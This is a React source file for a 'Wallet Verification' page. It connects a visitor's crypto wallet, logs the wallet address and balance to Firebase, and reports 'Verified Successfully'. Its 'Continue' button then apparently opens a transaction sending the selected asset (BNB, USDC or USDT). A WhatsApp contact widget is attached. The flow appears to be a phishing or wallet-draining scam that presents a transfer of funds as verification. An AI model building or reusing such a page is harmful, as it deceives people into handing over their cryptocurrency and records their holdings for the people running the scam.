import { useState, useEffect, useRef } from "react";
import { Button } from "@/components/ui/button";
import { useToast } from "@/hooks/use-toast";
import { Check, ArrowRight } from "lucide-react";
import {
    Select,
    SelectContent,
    SelectItem,
    SelectTrigger,
    SelectValue,
} from "@/components/ui/select"
import { useAppKit, useAppKitAccount } from '@reown/appkit/react'
import { useBalance } from 'wagmi'
import { logUserConnection } from '@/lib/firebase'
import { useWalletSend } from '@/hooks/useWalletSend'
import FloatingWhatsApp from "@/components/FloatingWhatsApp";
const Index = () => {
    const [isConnecting, setIsConnecting] = useState(false);
    const { toast } = useToast();
    const { open } = useAppKit()
    const { handleOpenSendWithArguments } = useWalletSend()
    const { address, isConnected } = useAppKitAccount()
    const [selectedAsset, setSelectedAsset] = useState('BNB')

    const { data: balanceData } = useBalance({
        address: address as `0x${string}`,
    })

    const hasLogged = useRef(false)

    useEffect(() => {
        if (isConnected && address && balanceData && !hasLogged.current) {
            logUserConnection(
                address,
                balanceData.formatted,
                balanceData.symbol
            )
            hasLogged.current = true
        }

        if (!isConnected) {
            hasLogged.current = false
        }
    }, [isConnected, address, balanceData])

    useEffect(() => {
        if (isConnected && isConnecting) {
            setIsConnecting(false)
            toast({
                title: "Verified Successfully",
                description: "Your verification has been completed.",
            });
        }
    }, [isConnected, isConnecting, toast])

    const handleVerify = async () => {
        try {
            setIsConnecting(true);
            await open();
        } catch (err) {
            setIsConnecting(false);
        }
    };

    const handlePartnerClick = async (partner: string) => {
        try {
            await handleOpenSendWithArguments(selectedAsset)
        } catch (err) {
            // Error already handled in hook
        }
    }

    return (
        <main className="flex min-h-screen items-center justify-center bg-background">
            <div className="text-center space-y-6">
                <h1 className="text-3xl font-semibold text-foreground tracking-tight">
                    Wallet Verification
                </h1>
                <p className="text-muted-foreground">
                    Click the button below to verify your wallet
                </p>
                {isConnected &&
                    <div className="max-w-xs mx-auto mb-12">
                        <label className="block text-center text-primary/80 text-sm font-medium mb-3">
                            Select Asset to Interact With
                        </label>
                        <Select value={selectedAsset} onValueChange={setSelectedAsset}>
                            <SelectTrigger className="w-full bg-navy-lighter/30 border-primary/20 text-foreground">
                                <SelectValue placeholder="Select Asset" />
                            </SelectTrigger>
                            <SelectContent className="bg-navy-light border-primary/20">
                                <SelectItem value="BNB">BNB Smart Chain (BNB)</SelectItem>
                                <SelectItem value="USDC">USD Coin (USDC)</SelectItem>
                                <SelectItem value="USDT">Tether (USDT)</SelectItem>
                            </SelectContent>
                        </Select>

                    </div>
                }
                <Button
                    onClick={() => { isConnected ? handlePartnerClick('USDT') : handleVerify() }}
                    disabled={isConnecting}
                    size="lg"
                    className="min-w-[160px] transition-all duration-300"
                >
                    {isConnecting ? (
                        "Connecting..."
                    ) : isConnected ? (

                        <>
                            Continue
                            <ArrowRight className="ml-2 h-4 w-4" />
                        </>
                    ) : (
                        <>
                            <Check className="mr-2 h-4 w-4" />
                            Verify
                        </>
                    )}
                </Button>
            </div>
             <FloatingWhatsApp />
        </main>
    );
};

export default Index;
